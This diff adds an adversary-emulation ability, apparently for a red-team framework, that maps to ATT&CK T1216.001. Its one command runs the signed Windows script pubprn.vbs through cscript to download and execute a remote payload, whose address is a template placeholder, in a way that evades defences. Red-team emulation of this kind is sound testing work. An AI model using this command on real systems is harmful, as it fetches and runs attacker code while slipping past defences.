@@ -1,0 +1,18 @@
+---
+- id: 35a47c6fdbc5e6756664a2b7ecc1f90b
+  name: PubPrn.vbs Signed Script Bypass
+  description: 'Executes the signed PubPrn.vbs script with options to download and
+    execute an arbitrary payload.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1216.001
+    name: 'Signed Script Proxy Execution: Pubprn'
+  platforms:
+    windows:
+      cmd:
+        command: cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
+          localhost "script:#{remote_payload}"
+        payloads: []
+        cleanup: ''
